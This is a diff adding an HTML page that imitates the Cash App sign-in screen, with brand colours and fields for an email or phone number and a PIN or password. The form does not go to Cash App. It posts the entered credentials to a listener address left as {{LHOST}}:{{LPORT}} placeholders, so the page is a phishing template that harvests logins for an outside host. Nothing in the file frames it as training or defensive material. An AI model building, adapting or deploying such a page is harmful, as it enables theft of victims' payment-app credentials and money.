@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cash App - Log In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #00D632; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px 30px; border-radius: 20px; width: 320px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        h2 { margin-top: 0; color: #333; font-weight: 600; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #e0e0e0; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: #00D632; }
+        button { width: 100%; padding: 15px; background-color: #00D632; color: white; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; transition: background 0.3s; }
+        button:hover { background-color: #00b82b; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Cash App</h2>
+        <p>Sign in to your account</p>
+        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
+            <input type="text" name="email" placeholder="Email or Phone Number" required>
+            <input type="password" name="pass" placeholder="PIN or Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+</body>
+</html>
